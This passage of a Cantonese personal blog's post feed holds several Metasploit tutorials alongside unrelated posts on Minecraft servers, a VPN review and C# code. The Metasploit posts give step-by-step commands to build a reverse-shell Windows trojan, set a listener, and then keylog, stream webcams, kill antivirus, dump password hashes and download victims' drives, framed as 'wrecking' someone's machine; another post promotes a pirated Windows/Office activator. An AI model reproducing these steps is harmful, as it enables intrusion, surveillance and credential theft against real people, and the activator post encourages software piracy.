<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -r</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Removing the existing Meterpreter service</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\Go0s\AppData\Local\Temp\KRUyRiAody...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Stopping the service...</span><br><span class="line">	 * Stopping service metsvc</span><br><span class="line"> * Removing service</span><br><span class="line">Service metsvc successfully removed.</span><br></pre></td></tr></table></figure>


<h1 id="更多指令"><a href="#更多指令" class="headerlink" title="更多指令"></a>更多指令</h1><p>入返去 <code>meterpreter</code> 打help</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             <span class="built_in">Help</span> menu</span><br><span class="line">    background    Backgrounds the current session</span><br><span class="line">    channel       Displays information about active channels</span><br><span class="line">...<span class="built_in">more</span></span><br></pre></td></tr></table></figure>

<h1 id="常用指令-入侵後"><a href="#常用指令-入侵後" class="headerlink" title="常用指令 (入侵後)"></a>常用指令 (入侵後)</h1><ul>
<li>reboot 重開條友部機</li>
<li>shutdown 熄鳩條友部機</li>
<li>help 所有指令</li>
<li>uictl 控制佢 Keyboard Mouse 既 開關</li>
<li>ls 列出呢個Paths既 Files Folder</li>
<li>cd 進入</li>
<li>ps 列出佢開緊啲乜Program</li>
<li>screenshare 直播佢部機既畫面</li>
<li>screenshot Cap佢部機而加既畫面</li>
<li>mouse 控制佢部機而加既 x y 坐標</li>
<li>keyscan_start 開始 Capturing 佢Keyboard撳過d乜制</li>
<li>keyscan_dump 攞你 Capturing 到既 Key</li>
<li>keyscan_stop 停止 Captring Keyboard</li>
<li>keyevent 發送鍵盤文字</li>
<li>sysinfo 攞佢呢部機而加既系統資料</li>
<li>suspend 停鳩佢某程式既控制</li>
<li>shell 用cmd</li>
<li>webcam_stream 佢如果有webcam 就直播佢webcam (需要有Browser)</li>
<li>load 載入套件</li>
<li>migrate 將程式移動特定 Process (Inject)</li>
<li>download 下載檔案</li>
</ul>
<h2 id="常用指令格式-入侵後"><a href="#常用指令格式-入侵後" class="headerlink" title="常用指令格式 (入侵後)"></a>常用指令格式 (入侵後)</h2><p>download 佢既 File (下載既Mount 預設會係佢開你呢個 Trojan既 mount)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">download filename.type</span><br></pre></td></tr></table></figure>

<p>將人地成個 mount 既 file 下載 (指定 Mount)</p>
<p>打 <code>show_mount</code> 查下佢有乜 <code>mount</code></p>
<p>查到之後打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">download e:\\ # 下載成個 e mount 既 File (有啲file 要有 Admin 權限先 Downlaod到)</span><br><span class="line">download * #下載所有你目前位置既所有 File</span><br></pre></td></tr></table></figure>

<p>就咁一個file</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">download e:\\hi.txt</span><br></pre></td></tr></table></figure>

<p>cd 去其他 Mount</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd e: #入 e mount</span><br><span class="line">cd d: #入 d mount</span><br></pre></td></tr></table></figure>



<p>…. 仲有好多 但係我已經懶得打- - 大家可以自己打 <code>help</code> 查下 @@</p>
<h1 id="常用使用滲透模組-入侵後"><a href="#常用使用滲透模組-入侵後" class="headerlink" title="常用使用滲透模組 (入侵後)"></a>常用使用滲透模組 (入侵後)</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/migrate #程式自動遷移</span><br><span class="line">run post/windows/gather/checkvm #檢視目標主機是否執行在虛擬機器上 查部機係咪行緊 VM</span><br><span class="line">run post/windows/manage/killav #關閉防毒軟體 熄撚左佢個防毒(AV)</span><br><span class="line">run post/windows/manage/enable_rdp #開啟遠端桌面服務 (幫佢開返rdp [遠端桌面服務])</span><br><span class="line">run post/windows/manage/autoroute #睇下Route資料</span><br><span class="line">run post/windows/gather/enum_logged_on_users #列出而加登入左既用戶資料</span><br><span class="line">run post/windows/gather/enum_applications #列出應用程式</span><br><span class="line">run windows/gather/credentials/windows_autologin #攞自動登入既使用者名稱同密碼</span><br><span class="line">run windows/gather/smart_hashdump #dump出所有使用者既hash</span><br><span class="line">run killav.rb # 殺死防毒(AV)</span><br><span class="line">run post/windows/capture/keylog_recorder #使用Keylogger 記錄鍵盤操作</span><br></pre></td></tr></table></figure>

<h1 id="查-Module"><a href="#查-Module" class="headerlink" title="查 Module"></a>查 Module</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search post/windows</span><br></pre></td></tr></table></figure>

<p>參考資料 :<br><a href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-backdoor/">https://www.offensive-security.com/metasploit-unleashed/meterpreter-backdoor/</a></p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Ethical hacking</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit - 基本指令</title>
    <url>/2022/06/14/Metasploit-commands/</url>
    <content><![CDATA[<img src="/img/Post/image/Metasploit/cover.svg" width="200px"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以下指令並唔係用黎入侵用，<br>係用黎控制你而加既 Metasploit 去邊度。</p>
<ul>
<li>進入 Sessions</li>
<li>退出 Sessions</li>
<li>啟動反向 TCP 處理程序</li>
</ul>
<h2 id="啟動反向-TCP-處理程序-即係運行"><a href="#啟動反向-TCP-處理程序-即係運行" class="headerlink" title="啟動反向 TCP 處理程序 (即係運行)"></a>啟動反向 TCP 處理程序 (即係運行)</h2><p>進行即時監聽，如果目標已經開啟檔案後，就會有反應再進入該裝置。</p>
<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>方法有兩種，用呢個方法如果你係要停止監聽既話，你需要撳 <kbd>Ctrl</kbd>+<kbd>C</kbd> 停止。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>

<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>呢個方法就唔洗再撳 <kbd>Ctrl</kbd>+<kbd>C</kbd> 先停止到，<br>你可以喺同一個指令台度打指令，然後又唔影響你睇目前既監聽情況。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>

<h2 id="暫時退出目前-Sessions"><a href="#暫時退出目前-Sessions" class="headerlink" title="暫時退出目前 Sessions"></a>暫時退出目前 Sessions</h2><p>有時你想暫時退出但係又唔想將佢 close 左你可以打</p>
<blockquote>
<p>注 : 呢個係退出而加既Sessions (唔係將佢exit)</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">background</span><br></pre></td></tr></table></figure>

<h3 id="列出-Sessions"><a href="#列出-Sessions" class="headerlink" title="列出 Sessions"></a>列出 Sessions</h3><p>輸入以下指令可以列出你目前已經入侵成功的裝置名單，<br>會以 id 形式列出裝置。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sessions</span><br></pre></td></tr></table></figure>

<h3 id="進入-Sessions"><a href="#進入-Sessions" class="headerlink" title="進入 Sessions"></a>進入 Sessions</h3><p>當你看到列出的 id 才可以成功使用此指令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sessions -i [id]</span><br></pre></td></tr></table></figure>

<h3 id="退出現時-Sessions"><a href="#退出現時-Sessions" class="headerlink" title="退出現時 Sessions"></a>退出現時 Sessions</h3><p>當你不想再 Hack 這部裝置的時候，<br>你可以輸入以下指令退出。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit - Linux 系統安裝教學</title>
    <url>/2021/12/16/Metasploit-install/</url>
    <content><![CDATA[<img src="/img/Post/image/Metasploit/cover.svg" width="200px"/>

<h1 id="安裝-Metasploit-方法一"><a href="#安裝-Metasploit-方法一" class="headerlink" title="安裝 Metasploit (方法一)"></a>安裝 Metasploit (方法一)</h1><p>一行過既方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure>

<h1 id="安裝-Metasploit-方法二"><a href="#安裝-Metasploit-方法二" class="headerlink" title="安裝 Metasploit (方法二)"></a>安裝 Metasploit (方法二)</h1><p>分清楚啲既方法。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</span><br><span class="line">chmod 755 msfinstall</span><br><span class="line">./msfinstall</span><br></pre></td></tr></table></figure>

<h1 id="運行-Metasploit"><a href="#運行-Metasploit" class="headerlink" title="運行 Metasploit"></a>運行 Metasploit</h1><p>Terminal 輸入以下指令 :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p>參考資料：<br><a href="https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/">https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/</a></p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Ethical hacking</tag>
        <tag>安裝</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit - 問題解決 (Rex::BindFailed)</title>
    <url>/2021/12/16/Metasploit-issue-rexbindfailed/</url>
    <content><![CDATA[<img src="/img/Post/image/Metasploit/cover.svg" width="200px"/>

<h1 id="The-address-is-already-in-use"><a href="#The-address-is-already-in-use" class="headerlink" title="The address is already in use"></a>The address is already in use</h1><p>Rex::BindFailed The address is already in use or unavailable.</p>
<p>如佢文字所講既，因為你而加個 Port 係用緊，要解決呢個問題非常簡單。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[-] Handler failed to bind to 0.0.0.0:1234</span><br><span class="line">[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:1234).</span><br></pre></td></tr></table></figure>


<h1 id="Port-Pid-Check"><a href="#Port-Pid-Check" class="headerlink" title="Port Pid Check"></a>Port Pid Check</h1><p>查下呢粒 Port Number 既 pid 係乜，打返你個個程式用左既 port number 係乜，呢度我示範係用 <code>1234</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -i :1234</span><br></pre></td></tr></table></figure>

<h1 id="Kill-pid"><a href="#Kill-pid" class="headerlink" title="Kill pid"></a>Kill pid</h1><p>將 Printout 出黎既 PID Number kill，然後再 exploit 多次就得。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kill -9 [pid_number]</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Ethical hacking</tag>
        <tag>問題</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit - 外網木馬生成 (Windows exe)</title>
    <url>/2021/12/13/Metasploit-wan-exe/</url>
    <content><![CDATA[<img src="/img/Post/image/Metasploit/cover.svg" width="200px"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以下教學全程會用指令操作所有野，學好指令點打會更加得心應手，唔係既話，係會跟得好辛苦。</p>
<h2 id="需要工具"><a href="#需要工具" class="headerlink" title="需要工具"></a><strong><span style="font-size:larger;">需要工具</span></strong></h2><ul>
<li><a href="https://www.metasploit.com/">Metasploit</a> (Trojan 生成，操控中毒者電腦)</li>
<li><a href="https://ubuntu.com/download">Linux 系統</a> (本文章使用 Ubuntu)</li>
<li><a href="https://noob.tw/ufw/">ufw</a> (Linux 防火牆)</li>
<li><a href="https://curl.se/">curl</a> (下載 Metasploit,查你既 Public IP)</li>
</ul>
<h1 id="curl-安裝"><a href="#curl-安裝" class="headerlink" title="curl 安裝"></a>curl 安裝</h1><p>首先我地要查下你既 Public IP 係乜，打 <code>curl</code> 睇下有冇裝到，部機如果冇，即係冇裝到，咁打返呢句裝返 ~~</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install curl</span><br></pre></td></tr></table></figure>

<h2 id="查-Public-IP"><a href="#查-Public-IP" class="headerlink" title="查 Public IP"></a>查 Public IP</h2><p>Print 既 result 就係你既 Public IP Address。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl ifconfig.me</span><br></pre></td></tr></table></figure>

<h1 id="安裝-ufw"><a href="#安裝-ufw" class="headerlink" title="安裝 ufw"></a>安裝 ufw</h1><p>ufw 係一個防火牆工具，我地會用佢黎 set open port (tcp)。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ufw -y</span><br></pre></td></tr></table></figure>

<h2 id="啟用-ufw"><a href="#啟用-ufw" class="headerlink" title="啟用 ufw"></a>啟用 ufw</h2><p>當你成功安裝 ufw，預設係唔會為你開啟 ufw，我地需要用指令去為佢開啟返個程式。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw <span class="built_in">enable</span></span><br></pre></td></tr></table></figure>

<h3 id="開啟-Port-位置"><a href="#開啟-Port-位置" class="headerlink" title="開啟 Port 位置"></a>開啟 Port 位置</h3><p>今次我會用 tcp 同埋 <code>7777</code> Port Number.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw allow 7777/tcp</span><br></pre></td></tr></table></figure>


<h1 id="Wan-Trojan-生成"><a href="#Wan-Trojan-生成" class="headerlink" title="Wan Trojan 生成"></a>Wan Trojan 生成</h1><p>用 msfvenom 生成 後門 <code>exe</code> 檔案。</p>
<ul>
<li>LHOST 你既 Public IP Address</li>
<li>LPORT 你岩岩開左既 Port Number</li>
<li>fuckyou.exe 是但改個你鍾意既 exe file 名</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=7777 -f exe &gt; fuckyou.exe</span><br></pre></td></tr></table></figure>

<p>完成兩個步驟，包括係 :</p>
<ul>
<li>setup open port.</li>
<li>生成後門 <code>exe</code> 檔案。</li>
</ul>
<h1 id="設置監聽"><a href="#設置監聽" class="headerlink" title="設置監聽"></a>設置監聽</h1><p>當成功設置上述既野既時候，黎緊我地要做既係 setup 你既 metasploit 既控制台 (控制人地電腦)。</p>
<h2 id="開啟-msfconsole"><a href="#開啟-msfconsole" class="headerlink" title="開啟 msfconsole"></a>開啟 msfconsole</h2><p>開 Terminal 打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<img src="/2021/12/13/Metasploit-wan-exe/OPEN.png" class="">


<h2 id="Payload-進入"><a href="#Payload-進入" class="headerlink" title="Payload 進入"></a>Payload 進入</h2><p>喺呢度輸入兩句。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<h3 id="Payload-設置"><a href="#Payload-設置" class="headerlink" title="Payload 設置"></a>Payload 設置</h3><p>而加我地要將自己既 ip 打入去 options 度，我地而加係要做 Host。<br>但係 msfconsole 仲未知道你係 Host，我地喺控制台度打 <code>show options</code> 繼續操作落去。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>

<h3 id="查-Private-IP"><a href="#查-Private-IP" class="headerlink" title="查 Private IP"></a>查 Private IP</h3><p>黎到呢個位我地開另一個 Terminal 查我地而加既 Private IP 係乜，再將查到既呢個 Private IP 輸入去 msfconsole。</p>
<h3 id="安裝-net-tools"><a href="#安裝-net-tools" class="headerlink" title="安裝 net-tools"></a>安裝 net-tools</h3><p>打 <code>ifconfig</code> 查我地既 lan ip address係乜</p>
<p>如果你部機打 <code>ifconfig</code> 冇反應，<br>咁打返呢句裝返。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install net-tools -y</span><br></pre></td></tr></table></figure>

<h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><p>我地喺 Terminal 打以下指令，搵第一個既 <code>inet</code>，就係我地既 LAN ip addrss，查到之後就將你既 LAN ip address 打入去。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<h2 id="輸入-Private-IP"><a href="#輸入-Private-IP" class="headerlink" title="輸入 Private IP"></a>輸入 Private IP</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> LHOST [your lan ipv4]</span><br></pre></td></tr></table></figure>

<p>改埋你岩岩開左既 Port Number</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> LPORT [number]</span><br></pre></td></tr></table></figure>

<h2 id="確定數值"><a href="#確定數值" class="headerlink" title="確定數值"></a>確定數值</h2><p>做一個確定。<br>我地睇下個 set 既野岩唔岩 ~</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
<h1 id="開始監聽"><a href="#開始監聽" class="headerlink" title="開始監聽"></a>開始監聽</h1><p>確定哂之後你就可以輸入以下指令開始監聽，等待某人開啟呢個程式，然後呢邊 (Server)，就會有即時反應，然後就成功入侵 ~</p>
<img src="/2021/12/13/Metasploit-wan-exe/exploit.png" class="">

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>

<h2 id="入侵成功"><a href="#入侵成功" class="headerlink" title="入侵成功"></a>入侵成功</h2><p>見到佢開左就會自動有反應</p>
<p>去到呢個位你就可以搞破壞啦 ~~</p>
<img src="/2021/12/13/Metasploit-wan-exe/exploit-2.png" class="">]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Ethical hacking</tag>
      </tags>
  </entry>
  <entry>
    <title>Microsoft Toolkit - MS Office 同 Windows 既破解器</title>
    <url>/2022/01/22/Microsoft-Toolkit/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Microsoft Toolkit 是用於激活 Windows 和 MS Office 等 Microsoft 產品的軟件的最新版本，它是 KMSPico Activator 的替代品，它的工作原理幾乎相同，但有幾個新功能。 這是激活 Windows 10、8.1、8、7、Vista 和 Windows XP 等任何 Windows 的最佳工具。<br>不僅可以幫助您激活 Windows，還可以激活 Microsoft Office。<br>它是互聯網上 100% 安全可靠的激活器。</p>
<h2 id="官網"><a href="#官網" class="headerlink" title="官網"></a>官網</h2><ul>
<li><a href="https://www.official-kmspico.com/microsoft-toolkit-download/">Microsoft Toolkit</a></li>
</ul>
<p><a href="https://apk.tw/thread-880356-1-1.html">https://apk.tw/thread-880356-1-1.html</a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>破解器</tag>
      </tags>
  </entry>
  <entry>
    <title>Minecraft - 伺服器列表 Server list</title>
    <url>/2022/06/07/Minecraft-Server-list/</url>
    <content><![CDATA[<img src="/2022/06/07/Minecraft-Server-list/hi.png" class="">

<h1 id="外國伺服器"><a href="#外國伺服器" class="headerlink" title="外國伺服器"></a>外國伺服器</h1><ul>
<li><a href="https://minecraft-server-list.com/">https://minecraft-server-list.com/</a></li>
</ul>
<h1 id="亞洲伺服器"><a href="#亞洲伺服器" class="headerlink" title="亞洲伺服器"></a>亞洲伺服器</h1><ul>
<li><a href="https://www.mc-list.xyz/">https://www.mc-list.xyz/</a></li>
</ul>
<h2 id="生存伺服器-小人"><a href="#生存伺服器-小人" class="headerlink" title="生存伺服器 (小人)"></a>生存伺服器 (小人)</h2><h3 id="NEXUS-Server"><a href="#NEXUS-Server" class="headerlink" title="NEXUS Server"></a>NEXUS Server</h3><ul>
<li>nexusurvival.apexmc.co</li>
</ul>
<img src="/2022/06/07/Minecraft-Server-list/nexus.png" class="">]]></content>
      <categories>
        <category>Minecraft</category>
      </categories>
      <tags>
        <tag>Games</tag>
        <tag>Server</tag>
      </tags>
  </entry>
  <entry>
    <title>Misterhorse 插件 - Premiere Pro 同 After Effect 既插件</title>
    <url>/2022/01/18/Misterhorse-Extension/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有時剪片要同既特效同效果，呢啲林林種種既野，如果要自己整真係唔知要哂幾耐時間去整。<br>加上又要慢慢去學點整，個樣野又可能要用其他 Software 先砌到出黎。<br>有見及此，網路上係有好多唔同既插件係 for Premiere Pro 同埋 After Effect既，其他程式既插件都有，但我今日就唔講太多，今篇文針對 Premiere Pro 同 After Effect 黎講。<br>咁講左咁耐，到底有乜插件呢？</p>
<h2 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h2><p>我會介紹一款超好用既插件。<br>佢叫 <a href="https://misterhorse.com/">Mister horse</a>。</p>
<p>佢係有分 <a href="https://misterhorse.com/products-for-premiere-pro">Premiere Pro</a> 同埋 <a href="https://misterhorse.com/products-for-after-effects">After Effect</a> 版本既。</p>
<p>版本 :</p>
<p>Premiere Pro : <a href="https://misterhorse.com/products-for-premiere-pro">https://misterhorse.com/products-for-premiere-pro</a><br>After Effect : <a href="https://misterhorse.com/products-for-after-effects">https://misterhorse.com/products-for-after-effects</a></p>
<p>官網 : <a href="https://misterhorse.com/">https://misterhorse.com/</a></p>
<p>留意返係需要你申請一個 Account 先用到入面既功能。</p>
<img src="/2022/01/18/Misterhorse-Extension/1.png" class="">

<p>安裝完成之後你只需要去返 Premiere Pro 上面撳 Windows &gt; Extensions &gt; Premiere Composer。<br>咁就會出左個 Windows 出黎，然後登入返再等佢一陣就會出現佢既 Function。</p>
<p>示範影片:</p>
<img src="/2022/01/18/Misterhorse-Extension/2.gif" class="">]]></content>
      <categories>
        <category>Adobe</category>
      </categories>
      <tags>
        <tag>Mister horse</tag>
        <tag>Premiere Pro</tag>
        <tag>After Effect</tag>
      </tags>
  </entry>
  <entry>
    <title>Mullvad VPN - 極推薦的瑞典開源 VPN 服務</title>
    <url>/2022/05/24/Mullvad-VPN-Apps/</url>
    <content><![CDATA[<p align="center">
    <img alt="Mullvad VPN" src="cover.png" width="200px"/>
    <h1 align="center">Mullvad VPN</h1>
</p>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Mullvad 是位於瑞典的開源 VPN 服務。<br>Mullvad 於 2009 年 3 月推出，<br>使用 WireGuard 和 OpenVPN 協議運行，<br>除了傳統的支付方式之外，Mullvad 還接受比特幣、比特幣現金和門羅幣的訂閱。</p>
<p><a href="https://mullvad.net/en/">https://mullvad.net/en/</a></p>
<h2 id="申請帳號"><a href="#申請帳號" class="headerlink" title="申請帳號"></a>申請帳號</h2><ul>
<li>免電子郵件</li>
<li>免電話</li>
<li>匿名生成一個唯一的 16 位帳號</li>
<li>高度匿名</li>
</ul>
<p>在 Mullvad 的註冊過程中，<br>不會求提供電子郵件地址或其他識別信息，<br>而是為每個新用戶匿名生成一個唯一的 16 位帳號，<br>此帳號今後將用於登錄 Mullvad 服務。</p>
<img src="/2022/05/24/Mullvad-VPN-Apps/ac%20num.png" class="">

<h2 id="付費方法"><a href="#付費方法" class="headerlink" title="付費方法"></a>付費方法</h2><ul>
<li>比特幣</li>
<li>現金</li>
<li>Google 點數卡</li>
<li>Apple 點數卡</li>
<li>銀行電匯</li>
<li>信用卡</li>
<li>PayPal</li>
<li>Swish</li>
</ul>
<p>為了幫助確保用戶的隱私，<br>Mullvad 接受現金、比特幣和比特幣現金的匿名支付方式。（也可以通過銀行電匯、信用卡、PayPal 和 Swish 支付服務費用，也接受使用 Apple 點數和 Google 點數支付）。</p>
<img src="/2022/05/24/Mullvad-VPN-Apps/payments.png" class="">

<h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>對於其 VPN 服務的用戶，<br>Mullvad 的無日誌記錄政策禁止記錄以下內容：用戶的 IP 地址、使用的 VPN IP 地址、瀏覽活動、帶寬、連接、會話持續時間、時間戳和 DNS 請求。<br>TechRadar 評論指出： “所有這一切的最終結果是，您不必擔心 Mullvad 如何處理法院請求以訪問您的使用數據，因為沒有任何數據。”</p>
<ul>
<li>不記錄流量記錄</li>
<li>不記錄 DNS 請求</li>
<li>不記錄連接時間，包括何時建立、何時斷開連接、持續多長時間或任何類型的時間戳</li>
<li>不記錄 IP 地址</li>
<li>不記錄用戶帶寬</li>
<li>無日誌記錄政策</li>
</ul>
<h2 id="伺服器"><a href="#伺服器" class="headerlink" title="伺服器"></a>伺服器</h2><p>截至 2022 年 4 月，Mullvad 的服務器列表顯示了 38 個國家（68 個城市）的 823 台服務器的信息。</p>
<h2 id="加密方法"><a href="#加密方法" class="headerlink" title="加密方法"></a>加密方法</h2><p>TechRadar 評論指出，”Mullvad 的核心服務功能強大、最新，並且絕對包含高端技術。”<br>作為對開源 OpenVPN 和 WireGuard 協議的補充，<br>Mullvad 包括 “工業實力” 加密（使用 AES-256 GCM 方法）、4096 位 RSA 證書和 SHA-512 用於服務器身份驗證、完美的前向保密、多層 DNS 洩漏保護、IPv6 洩漏保護、多重隱身選項以幫助繞過政府或企業 VPN 阻塞，<br>並內置支持端口轉發。</p>
<h2 id="系統支援"><a href="#系統支援" class="headerlink" title="系統支援"></a>系統支援</h2><ul>
<li>Linux</li>
<li>Windows</li>
<li>Mac</li>
<li>IOS</li>
<li>Android</li>
</ul>
<p>Mullvad 為在 Windows、macOS 和 Linux 操作系統下運行的計算機提供 VPN 客戶端應用程序。<br>截至 2020 年 4 月，使用 WireGuard 協議的原生 iOS 和 Android Mullvad VPN 客戶端可用，<br>iOS 和 Android 移動操作系統用戶還可以配置和使用內置 VPN 客戶端或 OpenVPN 或 WireGuard 應用程序來訪問 Mullvad 的服務。</p>
<h2 id="網站追蹤比較"><a href="#網站追蹤比較" class="headerlink" title="網站追蹤比較"></a>網站追蹤比較</h2><img src="/2022/05/24/Mullvad-VPN-Apps/%E6%AF%94%E8%BC%83.png" class="">

<h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>VPN 係買一份信任同技術，Mullvad 不追蹤既方面，<br>我相信冇邊款同佢一樣所有野都<span style="background-color: red;color:black;">不追蹤</span>。<br>筆者我如果要我推薦 VPN 我一定係推呢款，<br>雖然佢 Server 小，但因為佢係 self-owned 先咁。<br>而單單係以上個三樣已經係足夠屌打其他款既 VPN，<br>以注重私隱為前提，<br>即使其他VPN有好多唔同既功能，<br>但信任一定係擺第一，<br>Surfshark 係有 兩層VPN，有好多Server，<br>但係佢既信譽低到咁點解我仲要用佢？<br>幫TVB賣廣告，賣資料俾大公司，又用埋 Google 既野，<br>仲要同 Nord VPN係同一個金主，<br>Nord VPN多次俾人 Hack Leaked左好多喪屍AC，<br>單單呢啲野已經有足夠理由唔好用<br>用VPN從來都係講個信字，當你既資料被出賣既時候，<br>功能性既野已經係唔重要，<br>一個唔匿名既VPN仲叫做VPN？</p>
]]></content>
      <categories>
        <category>匿名</category>
      </categories>
      <tags>
        <tag>程式</tag>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title>.Net C# - 更改背景圖片</title>
    <url>/2022/01/22/Net-C-Change-background-image/</url>
    <content><![CDATA[<h1 id="code"><a href="#code" class="headerlink" title="code"></a>code</h1><p>入去你既 Click event </p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">button_01_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  Form1.ActiveForm.BackgroundImage = <span class="keyword">global</span>::YourProjectName.Properties.Resources.ImageName1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">changeBGImageToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, System.EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Image myimage = <span class="keyword">new</span> Bitmap(<span class="string">@&quot;D:\Images\myImage1.jpg&quot;</span>);</span><br><span class="line">    <span class="keyword">this</span>.BackgroundImage = myimage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://stackoverflow.com/questions/20045676/how-to-change-background-image-of-a-form-in-c/20047187">https://stackoverflow.com/questions/20045676/how-to-change-background-image-of-a-form-in-c/20047187</a></p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title>Mozilla Firefox 快捷鍵</title>
    <url>/2022/01/18/Mozilla-Firefox-Shortkeys/</url>
